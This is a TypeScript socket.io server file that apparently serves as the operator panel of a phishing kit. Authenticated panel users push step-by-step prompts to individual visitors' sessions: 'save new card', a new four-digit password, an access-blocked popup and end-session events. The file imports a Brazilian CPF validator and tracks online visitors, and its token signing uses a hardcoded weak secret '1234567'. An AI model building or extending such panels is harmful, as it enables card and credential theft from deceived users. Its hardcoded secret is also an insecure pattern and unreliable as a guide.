import { Server, Socket } from "socket.io";
import {disconnectListaUsuario, extractTokenFromString, findOneUser, verifyToken } from "../helpers/socketHelper";
import jwt from 'jsonwebtoken';
import {escape, unescape} from 'html-escaper';
import { validadorCpf } from "../helpers/functionsHelper";


function getIdValue(cookieString:any) {
  const regex = /(?:^|;)\s*id=([^;]*)/;
  const match = cookieString.match(regex);
  return match ? match[1] : null;
}

export function configureSocket(server:any){
    const io = new Server(server);

    function authenticate(socket: Socket, next: (err?: any) => void){    
      const cookie = socket.handshake.headers.cookie
      
      
      const token = extractTokenFromString(cookie as string)
      if(!token){   
          socket.disconnect(true)
          return;
      }
      jwt.verify(token, '1234567', (err:any, decoded:any)=>{
          if(err){
              
              socket.disconnect(true)
              return;
          }
          socket.user = decoded;
          next();
      })
  }
    var onlines = [] as any
    
    
    io.on("connection", async (socket: Socket) => {

      onlines.push(socket.id)
      io.of('/painel/geral').emit('estatisticas', {onlines});
      
        
    
    });
    


    io.of('/painel/geral').use(authenticate)
    
    io.of('/painel/geral').on('connection', async (socket: Socket) =>{  
      
      if(!socket.user){
        
        socket.disconnect(true);
        return;
    }

      // for(let online of onlines){

      //   const info = await Info.findOne({id:online});
      //   if(info){
      //     socket.emit('register-data', [{dados:info, idSocket:socket.id, id:info.id, online:true}])
      //   }
      // }
      
      

      
      socket.on('blockAccess', (data) =>{
        io.to(data).emit('showPopup', 'Seu acesso foi bloqueado');
      })

      socket.on('telaCard', (data) => {
        io.to(data).emit('check-next-step', {success:true, message:'Salvar cartão novo!', step:2})
        return;
      })
      
      socket.on('newsenha4', (data) => {
        io.to(data.id).emit('newsenha4', {success:true})
      })

      socket.on('encerrar', (data) => {
        io.to(data.id).emit('encerrarinfo', {success:true})
      })
    })

    

    return io;
}